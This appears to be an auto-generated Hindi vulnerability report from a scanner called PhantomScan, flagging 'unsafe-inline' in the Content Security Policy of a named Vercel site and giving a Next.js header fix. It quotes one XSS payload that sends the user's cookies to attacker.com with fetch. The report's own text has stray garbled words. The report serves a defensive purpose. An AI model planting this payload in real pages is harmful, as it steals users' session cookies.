# PhantomScan Hindi Report
## Target: https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/

### CSP allows unsafe-inline scripts
**1. क्या है यह?**  
यह Content Security Policy (CSP) है, जो वेब पेज को बताती है कि ब्राउज़र कौन‑से स्क्रिप्ट (script) और resources चलाने की अनुमति दे। यहाँ `script-src` में `'unsafe-inline'` लिखा है, जिसका मतलब है कि पेज में लिखे हुए `<script>...</script>` जैसे इन‑लाइन स्क्रिप्ट को चलाने की अनुमति दी गई है। यह एक बड़ी सुरक्षा कमजोरी है।

**2. हमलावर कैसे exploit करता है?**  
हमलावर XSS (Cross‑Site Scripting) के जरिए पेज में खराब‑मिज़ाज (malicious) इन‑लाइन स्क्रिप्ट डाल देता है, जैसे:  

```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```  

चूँकि CSP में `'unsafe-inline'` है, ब्राउज़र इस इन‑लाइन स्क्रिप्ट को चलाने की इजाज़त देता है। परिणामस्वरूप हमलावर:

* यूज़र के कूकीज़, टोकन या अन्य संवेदनशील डेटा को चोरी कर सकता है,  
* पेज को अपने कब्जे में ले कर अनधिकृत कार्य कर सकता है,  
* फिशिंग या रansomware जैसी进一步 हमले कर सकता है।

**3. इस प्लेटफ़ॉर्म (https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app/) के लिए exact fix क्या है?**  

- **CSP हेडर/मेटा टैग को अपडेट करें** – `'unsafe-inline'` को हटाएँ और वैध स्क्रिप्ट‑स्रोत (nonces या hashes) जोड़ें।  
  उदाहरण (Next.js/vercel में):  

  ```js
  // next.config.js
  module.exports = {
    async headers() {
      return [
        {
          source: '/(.*)',          // सभी पेजों के लिए
          headers: [
            {
              key: 'Content-Security-Policy',
              value:
                "script-src 'self' 'nonce-{RANDOM}' 'sha256-{HASH}' https://nyay-mitra-rjwmzrjrv-sujaldelhi8999-8617s-projects.vercel.app; " +
                "object-src 'none'; base-uri 'self';"
            },
          ],
        },
      ];
    },
  };
  ```

  - यहाँ `{RANDOM}` एक यादृच्छिक nonce मान है, जो प्रत्येक रिक्वेस्ट पर बदलना चाहिए।  
  - `{HASH}` उस इन‑लाइन स्क्रिप्ट का SHA‑256 हैश है, जिसे आप तभी उपयोग कर सकते हैं जब स्क्रिप्ट बिल्कुल स्थिर हो।  

- **इन‑लाइन स्क्रिप्ट को हटाएँ या बाहरी फ़ाइल में ले जाएँ** – सबसे सुरक्षित तरीका यह है कि सभी JS को अलग‑अलग फ़ाइल (`.js`) में रखें और `script-src 'self'` या विशिष्ट डोमेन पर सीमित रखें।  

- **इवेंट‑हैंडलर (onclick, onload आदि) को हटाएँ** – इन्हें `addEventListener` के साथ जोड़ें, ताकि वे CSP की शर्तों के बाहर न जाएँ।  

- **तीसरे‑पक्ष की स्क्रिप्ट को मंज़ूरी दें** – यदि किसी बाहरी लाइब्रेरी (जैसे CDN) की आवश्यकता है, तो उसे `'self'` या उस CDN के डोमेन पर सीमित करें, और SRI (Subresource Integrity) का उपयोग करें।  

- **CSP को टेस्ट करें** – `report-uri` या `report-to` हेडर जोड़ें ताकि कोई भी उल्लंघन ब्राउज़र में रिपोर्ट हो, जिससे समस्या जल्दी पहचानी जा सके।  

इस प्रकार आप `'unsafe-inline'` को हटाकर, केवल अनुमति‑प्राप्त (nonce/ hash) इन‑लाइन स्क्रिप्ट या बाहरी स्क्रिप्टों को ही चलाने की अनुमति देंगे, जिससे XSS‑आधारित हमला संभव नहीं रहेगा।
